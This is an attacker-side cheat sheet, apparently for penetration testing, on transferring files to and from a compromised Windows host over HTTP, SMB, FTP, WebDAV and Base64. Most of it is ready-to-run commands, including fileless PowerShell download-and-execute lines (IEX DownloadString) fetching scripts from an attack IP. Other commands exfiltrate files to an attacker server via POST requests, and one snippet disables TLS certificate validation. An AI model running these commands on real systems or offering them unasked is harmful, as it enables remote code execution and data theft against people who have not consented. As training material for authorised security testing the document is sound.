## PowerShell Web Downloads

Standard outbound traffic is permitted via HTTP/HTTPS, but local execution policies or web filters may restrict binary downloads.

Standard download to disk using WebClient

```
(New-Object Net.WebClient).DownloadFile('http://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
```

Asynchronous download to prevent blocking the calling thread

```
(New-Object Net.WebClient).DownloadFileAsync('http://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
```

Fileless execution by downloading script string directly to memory

```
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/<FILE_NAME>.ps1')
```

Alternative fileless execution using pipeline input

```
(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/<FILE_NAME>.ps1') | IEX
```

Standard cmdlet download for PowerShell 3.0+

```
Invoke-WebRequest http://<ATTACK_IP>/<FILE_NAME> -OutFile <FILE_NAME>
```

- Net.WebClient -> `(New-Object Net.WebClient).DownloadFile` -> Prefer for speed and compatibility with older PowerShell versions.
    
- Invoke-WebRequest -> `iwr <URL> -OutFile <PATH>` -> Prefer when aliases (curl/wget) are needed, though it is noticeably slower.
    
- **Internet Explorer engine unavailable**: The first-launch configuration must be completed or the engine is missing.
    
- **SSL/TLS trust failure**: The certificate is not trusted by the local store.
    

1. Use `-UseBasicParsing` to bypass IE engine requirements.
2. Set the `ServicePointManager` callback to true to ignore SSL errors.

```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**Internet Explorer setup incomplete** will block `Invoke-WebRequest` unless basic parsing is specified.

---

## SMB File Transfer

The environment allows TCP/445 traffic or lacks restrictions on internal lateral file movement.

Initialize SMB server on attack host

```
sudo impacket-smbserver <SHARE_NAME> -smb2support <FILE_PATH>
```

Copy file from share to target current directory

```
copy \\<ATTACK_IP>\<SHARE_NAME>\<FILE_NAME>
```

Mount share with credentials to bypass unauthenticated guest restrictions

```
net use n: \\<ATTACK_IP>\<SHARE_NAME> /user:<USERNAME> <PASSWORD>
```

**Unauthenticated guest access blocked** by security policy on newer Windows versions requires providing credentials during share creation and mounting.

---

## FTP File Transfer

TCP/21/20 are reachable and native FTP clients are available on the target.

Start anonymous FTP server with write permissions

```
sudo python3 -m pyftpdlib --port 21 --write
```

Download file using PowerShell WebClient

```
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACK_IP>/<FILE_NAME>', 'C:\<FILE_PATH>')
```

Automated non-interactive FTP download via command file

```
echo open <ATTACK_IP> > ftpcommand.txt && echo USER anonymous >> ftpcommand.txt && echo binary >> ftpcommand.txt && echo GET <FILE_NAME> >> ftpcommand.txt && echo bye >> ftpcommand.txt && ftp -v -n -s:ftpcommand.txt
```

- **Anonymous write access enabled**: pyftpdlib defaults to anonymous; ensure `--write` is specified for uploads.

---

## WebDAV Transfer (SMB over HTTP)

Outbound TCP/445 is blocked by firewalls, causing SMB to attempt a failover connection via HTTP.

Start WebDAV server on attack host

```
sudo wsgidav --host=0.0.0.0 --port=80 --root=<FILE_PATH> --auth=anonymous
```

Connect to the root of the WebDAV server

```
dir \\<ATTACK_IP>\DavWWWRoot
```

Copy to a specific folder existing on the WebDAV server

```
copy <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>\
```

`DavWWWRoot` is a mandatory keyword for the Mini-Redirector driver when connecting to the server root.

---

## Base64 Terminal Transfer

No network communication is possible, but terminal access is available for copy-pasting strings.

Encode file on Linux for transfer

```
cat <FILE_NAME> | base64 -w 0; echo
```

Decode string on Windows target to file

```
[IO.File]::WriteAllBytes("<FILE_PATH>", [Convert]::FromBase64String("<BASE64_STRING>"))
```

Encode file on Windows for exfiltration

```
[Convert]::ToBase64String((Get-Content -path "<FILE_PATH>" -Encoding byte))
```

Verify transfer integrity using MD5 hashes.

```
Get-FileHash <FILE_PATH> -Algorithm md5
```

**CMD string length limit** of 8,191 characters will truncate large transfers in `cmd.exe`.

---

## Web Upload Operations

Exfiltration is required over HTTP/HTTPS to a controlled server.

Start upload-capable web server

```
python3 -m uploadserver
```

Upload via PowerShell script using Invoke-RestMethod

```
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>/PSUpload.ps1'); Invoke-FileUpload -Uri http://<ATTACK_IP>:8000/upload -File <FILE_PATH>
```

Exfiltrate file as Base64 POST request to Netcat

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte)); Invoke-WebRequest -Uri http://<ATTACK_IP>:<PORT>/ -Method POST -Body $b64
```

> ⚠️ Gap: The `PSUpload.ps1` script is not a native utility and must be pre-staged or downloaded from an external repository which may be blocked.

**Web shell limitations** may cause errors when attempting to send extremely large strings via POST or terminal.